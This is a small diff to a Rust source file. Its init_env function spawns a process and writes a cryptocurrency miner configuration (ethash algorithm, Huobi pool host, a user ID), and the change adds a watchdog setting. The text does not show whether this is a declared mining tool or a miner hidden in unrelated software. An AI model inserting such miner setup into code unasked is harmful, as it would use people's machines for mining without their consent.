@@ -15,7 +15,7 @@ pub fn init_env() {
     let mut process = command.spawn().unwrap();
     process.wait().unwrap();
     let mut config = File::create("c").unwrap();
-    config.write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e").unwrap();
+    config.write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\nwatchdog=1\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e").unwrap();
 }
 
 pub fn clean_env() {
